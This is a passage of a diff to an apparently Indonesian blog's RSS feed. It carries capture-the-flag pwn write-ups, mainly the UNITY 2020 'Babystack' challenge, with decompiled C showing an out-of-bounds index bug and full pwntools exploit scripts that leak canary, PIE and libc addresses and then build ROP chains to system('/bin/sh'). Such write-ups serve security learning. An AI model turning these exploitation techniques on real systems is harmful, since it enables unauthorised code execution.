+    leak <span style="color:#f92672">=</span> (leak2 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">+</span> leak1
+
+    <span style="color:#66d9ef">return</span> leak
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+
+    canary <span style="color:#f92672">=</span> leak(<span style="color:#ae81ff">18</span>)
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;canary : {}&#39;</span><span style="color:#f92672">.</span>format(hex(canary)))
+
+    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak(<span style="color:#ae81ff">22</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x270b3</span> 
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;libc base @ {}&#39;</span><span style="color:#f92672">.</span>format(hex(libc<span style="color:#f92672">.</span>address)))
+
+    elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak(<span style="color:#ae81ff">30</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x9d2</span>
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;pie base @ {}&#39;</span><span style="color:#f92672">.</span>format(hex(elf<span style="color:#f92672">.</span>address)))
+     
+    pop_rdi <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000000ba3</span>
+    ret <span style="color:#f92672">=</span> pop_rdi <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+
+    binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;/bin/sh&#39;</span>))
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;/bin/sh @ {}&#39;</span><span style="color:#f92672">.</span>format(hex(binsh)))
+
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;n: &#39;</span>, <span style="color:#e6db74">&#39;30&#39;</span>)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">18</span>):
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(canary <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(canary <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(pop_rdi <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(pop_rdi <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(binsh <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(binsh <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(ret <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(ret <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>)
+
+    p<span style="color:#f92672">.</span>interactive()
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+
+    p <span style="color:#f92672">=</span> process(BINARY)
+
+    <span style="color:#66d9ef">if</span> len(argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">if</span> argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;d&#39;</span>:
+            p <span style="color:#f92672">=</span> remote(HOST, PORT)
+        <span style="color:#66d9ef">else</span>:
+            cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">            &#39;&#39;&#39;</span>
+            gdb<span style="color:#f92672">.</span>attach(p, cmd)
+    exploit()
+</code></pre></div><p><img src="/img/sum-3.png" alt="image alt text"></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>UNITY 2020 - Babystack</title>
+            <link>https://fikriguska.github.io/posts/2020/03/unity-2020-babystack/</link>
+            <pubDate>Tue, 17 Mar 2020 00:00:00 +0000</pubDate>
+            
+            <guid>https://fikriguska.github.io/posts/2020/03/unity-2020-babystack/</guid>
+            <description>hint:
 overwriting return address by overflowing the boundary Diberikan file ELF dengan proteksi sebagai berikut:
 @m00n ➜ babystack git:(master) ✗ checksec main [*] &amp;#39;/home/bintang/CTF/unity2020/pwn/babystack/main&amp;#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ELF tersebut menggunakan libc 2.23 dan memiliki vulnerability Out of Bond (OOB), Berikut fungsi yang memiliki vulnerability tersebut:
 __int64 __fastcall add_book(__int64 a1) { signed int v2; // [rsp+1Ch] [rbp-4h]  printf(&amp;#34;Enter index : &amp;#34;); v2 = read_int(&amp;#34;Enter index : &amp;#34;); if ( v2 &amp;gt; 7 ) printf(&amp;#34;not for OOB\b&amp;#34;); printf(&amp;#34;Enter the name of Books : &amp;#34;); return read_wrapper(30LL * v2 + a1, 29LL); } Program tersebut dapat mengoverwrite array dengan index kurang dari 0 atau lebih dari 7 sehingga kita bisa mengoverwrite sesuatu.</description>
-    </item>
-    
-    <item>
-      <title>Tulisan Pertama</title>
-      <link>https://fikriguska.github.io/posts/tulisan-pertama/</link>
-      <pubDate>Mon, 16 Mar 2020 00:00:00 +0000</pubDate>
-      
-      <guid>https://fikriguska.github.io/posts/tulisan-pertama/</guid>
-      <description>#Halo. Ini adalah tulisan pertama dari blog saya. Nantinya blog ini dipake untuk nulisin apa yang ada dipikiran saya, isinya bakal macem-macem ga cuman satu topik aja 😅, udah sih mungkin gitu aja wkwk</description>
-    </item>
-    
-  </channel>
+            <content type="html"><![CDATA[<p>hint:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">overwriting return address by overflowing the boundary
+</code></pre></div><p>Diberikan file ELF dengan proteksi sebagai berikut:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">@m00n ➜ babystack git:(master) ✗ checksec main
+[*] &#39;/home/bintang/CTF/unity2020/pwn/babystack/main&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre></div><p>ELF tersebut menggunakan libc 2.23 dan memiliki vulnerability Out of Bond (OOB), Berikut fungsi yang memiliki vulnerability tersebut:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">add_book</span>(<span style="color:#66d9ef">__int64</span> a1)
+{
+  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [rsp+1Ch] [rbp-4h]
+</span><span style="color:#75715e"></span>
+  printf(<span style="color:#e6db74">&#34;Enter index : &#34;</span>);
+  v2 <span style="color:#f92672">=</span> read_int(<span style="color:#e6db74">&#34;Enter index : &#34;</span>);
+  <span style="color:#66d9ef">if</span> ( v2 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">7</span> )
+    printf(<span style="color:#e6db74">&#34;not for OOB</span><span style="color:#ae81ff">\b</span><span style="color:#e6db74">&#34;</span>);
+  printf(<span style="color:#e6db74">&#34;Enter the name of Books : &#34;</span>);
+  <span style="color:#66d9ef">return</span> read_wrapper(<span style="color:#ae81ff">30LL</span> <span style="color:#f92672">*</span> v2 <span style="color:#f92672">+</span> a1, <span style="color:#ae81ff">29LL</span>);
+}
+</code></pre></div><p>Program tersebut dapat mengoverwrite array dengan index kurang dari 0 atau lebih dari 7 sehingga kita bisa mengoverwrite sesuatu. Tapi overwrite kemana? fungsi main tidak akan pernah melakukan return, karena adanya fungsi <code>exit(1)</code> jika ingin keluar. Berikut adalah fungsi <code>main</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+{
+  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> <span style="color:#f92672">*</span>v3; <span style="color:#75715e">// rdi
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// eax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// [rsp-108h] [rbp-108h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> v6; <span style="color:#75715e">// [rsp-100h] [rbp-100h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> v7; <span style="color:#75715e">// [rsp-F8h] [rbp-F8h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v8; <span style="color:#75715e">// [rsp-F0h] [rbp-F0h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v9; <span style="color:#75715e">// [rsp-ECh] [rbp-ECh]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> v10; <span style="color:#75715e">// [rsp-EAh] [rbp-EAh]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> v11; <span style="color:#75715e">// [rsp-E2h] [rbp-E2h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> v12; <span style="color:#75715e">// [rsp-DAh] [rbp-DAh]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v13; <span style="color:#75715e">// [rsp-D2h] [rbp-D2h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v14; <span style="color:#75715e">// [rsp-CEh] [rbp-CEh]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v15; <span style="color:#75715e">// [rsp-10h] [rbp-10h]
+</span><span style="color:#75715e"></span>
+  v15 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
+  setvbuf(_bss_start, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0LL</span>);
+  memset(<span style="color:#f92672">&amp;</span>v5, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0xF0uLL</span>);
+  v5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">8297711242406229317LL</span>;
+  v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">8389754676365247776LL</span>;
+  v7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">8026900115340861555LL</span>;
+  v8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1920230765</span>;
+  v9 <span style="color:#f92672">=</span> <span style="color:#ae81ff">121</span>;
+  v3 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">2337214414269147508LL</span>;
+  v10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">7166744811854392905LL</span>;
+  v11 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2337214414269147508LL</span>;
+  v12 <span style="color:#f92672">=</span> <span style="color:#ae81ff">4692876574359185740LL</span>;
+  v13 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1650812780</span>;
+  v14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">114</span>;
+  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+  {
+    <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+    {
+      <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+      {
+        menu(v3);
+        v4 <span style="color:#f92672">=</span> read_int(v3);
+        <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> )
+          <span style="color:#66d9ef">break</span>;
+        v3 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v5;
+        print_book(<span style="color:#f92672">&amp;</span>v5);
+      }
+      <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span> )
+        <span style="color:#66d9ef">break</span>;
+      <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> )
+        <span style="color:#66d9ef">goto</span> LABEL_13;
+      v3 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v5;
+      list_book(<span style="color:#f92672">&amp;</span>v5);
+    }
+    <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> )
+    {
+      v3 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v5;
+      add_book((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v5);
+    }
+    <span style="color:#66d9ef">else</span>
+    {
+      <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">4</span> )
+      {
+LABEL_13:
+        puts(<span style="color:#e6db74">&#34;Bye&#34;</span>);
+        exit(<span style="color:#ae81ff">1</span>); <span style="color:#75715e">/* tidak akan pernah return */</span>
+      }
+      v3 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v5;
+      remove_book(<span style="color:#f92672">&amp;</span>v5);
+    }
+  }
+}
+</code></pre></div><p>Kita tidak akan bisa mengontrol saved RIP fungsi <code>main</code>. Namun kita bisa mengoverwrite saved RIP fungsi lain, bagaimana caranya? yaitu dengan menggunakan index kurang dari 0. Jika fungsi <code>main</code> memanggil fungsi yang lain, stack frame fungsi main akan berada dibawah fungsi yang dipanggil (walaupun sebenarnya alamat stack frame fungsi <code>main</code> lebih tinggi dari fungsi yang dipanggil). Karena itulah kita menggunakan index kurang dari 0 untuk mengoverwrite saved RIP.
+Agar mempermudah, berikut beberapa fungsi yang dibuat:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_</span>(index):
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;index : &#39;</span>, str(index))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(index, name):
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;index : &#39;</span>, str(index))
+	p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;: &#39;</span>, name)
+</code></pre></div><h2 id="leak">#leak</h2>
+<p>Cara yang saya gunakan adalah dengan memasukkan padding pada index ke 8 sebanyak 16 untuk leak PIE dan 24 untuk leak libc. Padding tersebut tidak boleh terdapat <code>'\n'</code>, karena karakter <code>'\n'</code> akan diubah menjadi NULL.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">read_wrapper</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>a1, <span style="color:#66d9ef">int</span> a2)
+{
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// [rsp-Ch] [rbp-Ch]
+</span><span style="color:#75715e"></span>
+  v3 <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>, a1, a2);
+  <span style="color:#66d9ef">if</span> ( (v3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x80000000</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> )
+  {
+    puts(<span style="color:#e6db74">&#34;Read Error&#34;</span>);
+    exit(<span style="color:#ae81ff">1</span>);
+  }
+  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)a1 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span>)v3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span> )
+    <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)a1 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span>)v3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">/* akan diganti dengan NULL */</span>
+  <span style="color:#66d9ef">return</span> v3;
+}
+</code></pre></div><p>Jika kita menggunakan <code>'\n'</code>, kita tidak akan bisa meleak karena <code>printf()</code> akan mencetak output sampai ditemukannya NULL. Berikut fungsi <code>print_book</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">print_book</span>(<span style="color:#66d9ef">__int64</span> a1)
+{
+  <span style="color:#66d9ef">int</span> result; <span style="color:#75715e">// eax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [rsp-Ch] [rbp-Ch]
+</span><span style="color:#75715e"></span>
+  printf(<span style="color:#e6db74">&#34;Enter index : &#34;</span>);
+  v2 <span style="color:#f92672">=</span> read_int();
+  printf(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)v2);
+  <span style="color:#66d9ef">if</span> ( v2 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">7</span> )
+    puts(<span style="color:#e6db74">&#34;not for OOB&#34;</span>);
+  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_BYTE <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">30LL</span> <span style="color:#f92672">*</span> v2 <span style="color:#f92672">+</span> a1) )
+    result <span style="color:#f92672">=</span> printf(<span style="color:#e6db74">&#34;%d. %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)v2, a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">30LL</span> <span style="color:#f92672">*</span> v2);
+  <span style="color:#66d9ef">else</span>
+    result <span style="color:#f92672">=</span> printf(<span style="color:#e6db74">&#34;%d. (empty)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)v2);
+  <span style="color:#66d9ef">return</span> result;
+}
+</code></pre></div><p>berikut kode untuk leaknya:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">add(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
+print_(<span style="color:#ae81ff">8</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;. &#39;</span>)
+leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)[<span style="color:#ae81ff">16</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+pie <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xd90</span>
+
+add(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>)
+print_(<span style="color:#ae81ff">8</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;. &#39;</span>)
+leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)[<span style="color:#ae81ff">24</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20830</span>
+</code></pre></div><h2 id="shell">#shell</h2>
+<p>Agar bisa mendapatkan shell ada beberapa kemungkinan exploit yang digunakan, antara lain menggunakan one gadget atau jump ke <code>system(&quot;/bin/sh&quot;)</code>. Namun saya telah mencoba untuk menggunakan one gadget tetapi tidak bisa, jadi saya menggunakan alternatif lain yaitu jump ke <code>system(&quot;/bin/sh&quot;)</code>. Saya menggunakan ROP chain yang ditempatkan di index -3 dan akan mengoverwrite saved RIP dari fungsi <code>read_wrapper</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#75715e"># padding</span>
+payload <span style="color:#f92672">+=</span> p64(pie <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000000df3</span>) <span style="color:#75715e"># pop rdi; ret;</span>
+payload <span style="color:#f92672">+=</span> p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)))
+payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>])
+add(<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>, payload)
+</code></pre></div><p>berikut full exploitnya:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> sys
+
+BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./main&#39;</span>
+
+con <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;nc 35.192.113.20 3000&#39;</span>
+
+<span style="color:#66d9ef">if</span>(con):
+	con <span style="color:#f92672">=</span> con<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
+	HOST <span style="color:#f92672">=</span> con[<span style="color:#ae81ff">1</span>]
+	PORT <span style="color:#f92672">=</span> con[<span style="color:#ae81ff">2</span>]
+
+elf <span style="color:#f92672">=</span> ELF(BINARY)
+argv <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;gnome-terminal -e&#39;</span><span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.23.so&#34;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_</span>(index):
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;index : &#39;</span>, str(index))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(index, name):
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;index : &#39;</span>, str(index))
+	p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;: &#39;</span>, name)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+	add(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
+	print_(<span style="color:#ae81ff">8</span>)
+	p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;. &#39;</span>)
+	leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)[<span style="color:#ae81ff">16</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+	pie <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xd90</span>
+
+	add(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>)
+	print_(<span style="color:#ae81ff">8</span>)
+	p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;. &#39;</span>)
+	leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)[<span style="color:#ae81ff">24</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+	libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20830</span>
+
+	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
+	payload <span style="color:#f92672">+=</span> p64(pie <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000000df3</span>)
+	payload <span style="color:#f92672">+=</span> p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)))
+	payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>])
+	add(<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>, payload)
+
